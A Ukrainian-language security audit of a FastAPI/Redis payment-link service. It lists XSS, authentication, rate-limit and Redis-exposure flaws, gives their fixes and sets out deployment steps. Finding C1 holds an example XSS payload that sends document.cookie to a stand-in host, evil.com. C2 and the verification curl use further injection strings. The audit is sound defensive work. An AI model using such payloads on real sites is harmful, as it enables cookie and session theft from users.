# 🔒 VilnoPayService — Аудит безпеки та архітектурний ревʼю

**Дата:** 2026-06-24  
**Версія:** 2.0.0 → 3.0.0 (secure)  
**Стек:** FastAPI + Redis + Docker  

---

## 1. Знайдені вразливості

### 🔴 КРИТИЧНІ

#### C1. XSS через HTML-шаблон (OWASP A03:2021 Injection)

**Проблема:** `receiver`, `iban`, `purpose`, `amount` вставляються в HTML через f-string **без екранування**:
```python
# НЕБЕЗПЕЧНО — поточний код:
<span class="req-value">{receiver}</span>
```

**Атака:** Продавець (або MitM на n8n→API) надсилає:
```json
{"receiver": "<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>"}
```
→ JS виконується в браузері покупця.

**Фікс:** HTML-екранування через `markupsafe.escape()` + валідація на вході (заборона `<>`).

#### C2. XSS у JavaScript-блоці (OWASP A03:2021 Injection)

**Проблема:** Ті самі змінні вставляються в JS-строку `copyReqs()`:
```javascript
const text = `Отримувач: {receiver}\nIBAN: {iban}...`;
```

**Атака:** Якщо receiver = `test\n";alert(1);//`, ламається JS-синтаксис.

**Фікс:** Окрема функція `_js_escape()` для JS-контексту.

#### C3. API key передається в query string (OWASP A07:2021)

**Проблема:** `api_key` як query parameter → потрапляє в:
- access logs nginx та uvicorn
- browser history
- HTTP Referer
- proxy logs

**Фікс:** Перенести в `X-API-Key` header. Використовувати `secrets.compare_digest()` замість `!=` (timing attack).

### 🟠 ВИСОКІ

#### H1. Відсутній rate limiting (OWASP A04:2021)

**Проблема:** Жодний endpoint не має rate limit:
- `/generate` — DDoS заповнить Redis
- `/p/{link_id}` — перебір (хоча 96-біт ентропія рятує)
- `/qr.png` — CPU-дорога операція (генерація QR)

**Фікс:** `slowapi` + nginx rate limiting (два рівні захисту).

#### H2. Відсутня валідація вхідних даних (OWASP A03:2021)

**Проблема:**
- IBAN не валідується (формат UA + 27 цифр)
- amount — довільна строка, може бути `"-9999"` або `"<script>"`
- receiver/purpose — необмежена довжина
- code — не перевіряється формат ЄДРПОУ

**Фікс:** Pydantic `field_validator` з regex та обмеженнями довжини.

#### H3. Redis без автентифікації (OWASP A05:2021)

**Проблема:** Redis доступний без пароля в мережі `proxy` (external). Будь-який контейнер у тій мережі має повний доступ до платіжних даних.

**Фікс:**
1. `--requirepass` для Redis
2. Окрема internal мережа (не `proxy`)
3. `--rename-command` для небезпечних команд (FLUSHALL, DEBUG, CONFIG)
4. `--maxmemory` + `allkeys-lru` для захисту від переповнення

#### H4. Stacktrace у відповідях (OWASP A09:2021)

**Проблема:**
```python
except Exception as e:
    raise HTTPException(500, detail=str(e))  # ← витік внутрішньої інформації
```

**Фікс:** Логувати traceback серверно, повертати generic повідомлення клієнту.

### 🟡 СЕРЕДНІ

#### M1. Відсутній HTTPS (OWASP A02:2021)
Сервіс слухає HTTP:8000. Без TLS платіжні дані передаються відкритим текстом.
→ nginx reverse proxy з Let's Encrypt.

#### M2. Відсутнє логування (OWASP A09:2021)
Жодного бізнес-логування: хто створив, коли відкрили, скільки разів.
→ structured logging з `logger.info("LINK_CREATED ...")`.

#### M3. Немає security headers (OWASP A05:2021)
HTML без CSP, X-Frame-Options, HSTS.
→ SecurityHeadersMiddleware.

#### M4. Docker: контейнер від root (OWASP A05:2021)
Dockerfile не створює непривілейованого користувача.
→ `USER appuser` в Dockerfile.

#### M5. Swagger UI відкритий (OWASP A01:2021)
`/docs` та `/redoc` доступні публічно — розкривають API-схему.
→ `docs_url=None, redoc_url=None`.

---

## 2. Оцінка ризиків

### IDOR на /p/{link_id}

| Параметр | Значення |
|----------|----------|
| Генератор | `secrets.token_urlsafe(12)` |
| Ентропія | 96 біт (12 байт × 8) |
| Простір | 7.92 × 10²⁸ комбінацій |
| Brute force (10 req/s) | 2.51 × 10²⁰ років |
| Brute force (10K req/s) | 2.51 × 10¹⁷ років |

**Вердикт:** ✅ `token_urlsafe(12)` достатньо безпечний. UUID4 дав би 122 біти, але довший URL. Рекомендація: залишити, додати rate limit.

### Webhook для підтвердження оплати

Зараз сервіс — "генератор посилань", він не знає чи оплатили. Для MVP це ОК.

**Коли знадобиться:**
- Якщо хочеш показувати "Оплачено" на сторінці
- Якщо треба автоматично закривати замовлення

**Реалізація (опціонально):**
```python
@app.post("/webhook/{link_id}/paid")
@limiter.limit("5/minute")
def mark_paid(request: Request, link_id: str,
              x_api_key: str | None = Header(None, alias="X-API-Key")):
    _check_key(x_api_key)
    link_id = _validate_link_id(link_id)
    raw = rdb.get(f"pay:{link_id}")
    if not raw:
        raise HTTPException(404, "Link not found")
    data = json.loads(raw)
    data["status"] = "paid"
    data["paid_at"] = int(time.time())
    ttl = rdb.ttl(f"pay:{link_id}")
    rdb.setex(f"pay:{link_id}", ttl, json.dumps(data))
    logger.info("LINK_PAID id=%s ip=%s", link_id, get_remote_address(request))
    return {"status": "ok"}
```

---

## 3. Що створено

### Файли

| Файл | Що робить |
|------|-----------|
| `app_secure.py` | Виправлена версія app.py з усіма фіксами |
| `_templates.py` | HTML шаблони з безпечним екрануванням |
| `requirements_secure.txt` | Додано slowapi, markupsafe |
| `Dockerfile.secure` | Non-root user, proxy-headers |
| `docker-compose.secure.yml` | Redis з паролем, ізольована мережа, ліміти ресурсів |
| `nginx/vilnopay.conf` | Reverse proxy з TLS та rate limiting |
| `.env.example` | Приклад конфігурації |

### Що виправлено в `app_secure.py`

| # | Вразливість | Як виправлено |
|---|------------|---------------|
| C1 | XSS HTML | `html_escape()` для всіх user-input полів |
| C2 | XSS JS | `_js_escape()` для JS-контексту |
| C3 | API key в URL | `Header(alias="X-API-Key")` + `secrets.compare_digest()` |
| H1 | Rate limit | `slowapi` — 10/min для generate, 30/min для pay_page |
| H2 | Валідація | Pydantic validators: IBAN regex, довжина, спецсимволи |
| H3 | Redis security | Пароль в docker-compose, ізольована мережа |
| H4 | Stacktrace | `logger.exception()` + generic error response |
| M2 | Логування | Structured logs: LINK_CREATED, LINK_VIEW, LINK_MISS |
| M3 | Headers | SecurityHeadersMiddleware (CSP, HSTS, X-Frame) |
| M4 | Root user | `USER appuser` в Dockerfile |
| M5 | Swagger | `docs_url=None, redoc_url=None` |

---

## 4. Як впровадити

### Крок 1: Швидкі фікси (зараз, 15 хвилин)

```bash
# Згенеруй пароль для Redis
REDIS_PW=$(openssl rand -base64 24)
echo "REDIS_PASSWORD=$REDIS_PW" >> .env
echo "REDIS_URL=redis://:$REDIS_PW@redis:6379/0" >> .env

# Скопіюй secure файли
cp app_secure.py app.py
cp _templates.py .
cp requirements_secure.txt requirements.txt
cp Dockerfile.secure Dockerfile
cp docker-compose.secure.yml docker-compose.yml

# Перезбери та запусти
docker compose down
docker compose build --no-cache
docker compose up -d
```

### Крок 2: n8n — зміни виклику API

Було (n8n HTTP Request):
```
POST https://pay.domain.com/generate?api_key=SECRET
```

Стало:
```
POST https://pay.domain.com/generate
Header: X-API-Key: SECRET
```

### Крок 3: Nginx (якщо ще не налаштований)

```bash
# Скопіюй конфіг
sudo cp nginx/vilnopay.conf /etc/nginx/sites-available/vilnopay
sudo ln -s /etc/nginx/sites-available/vilnopay /etc/nginx/sites-enabled/
# Сертифікат
sudo certbot --nginx -d pay.yourdomain.com
sudo nginx -t && sudo systemctl reload nginx
```

### Крок 4: Перевірка

```bash
# Health check
curl http://localhost:8099/health

# XSS тест — має повернути 422 (валідація)
curl -X POST http://localhost:8099/generate \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-key" \
  -d '{"receiver":"<script>alert(1)</script>","iban":"UA1234","code":"12345","purpose":"test"}'

# Rate limit тест — 11-й запит за хвилину має повернути 429
for i in $(seq 1 12); do
  echo "Request $i:"
  curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:8099/generate \
    -H "Content-Type: application/json" \
    -H "X-API-Key: your-key" \
    -d '{"receiver":"Test","iban":"UA123456789012345678901234567","code":"12345","purpose":"Test payment"}'
done
```

---

## 5. Чек-лист

- [ ] Скопіювати secure файли
- [ ] Згенерувати REDIS_PASSWORD
- [ ] Оновити .env (BASE_URL=https://..., ALLOWED_HOSTS)
- [ ] Змінити виклик API в n8n (X-API-Key header)
- [ ] Налаштувати nginx з TLS
- [ ] Перебілдити docker compose
- [ ] Перевірити XSS protection (curl з `<script>`)
- [ ] Перевірити rate limiting
- [ ] Перевірити Redis auth (`redis-cli` без пароля має фейлити)
- [ ] Перевірити що /docs повертає 404
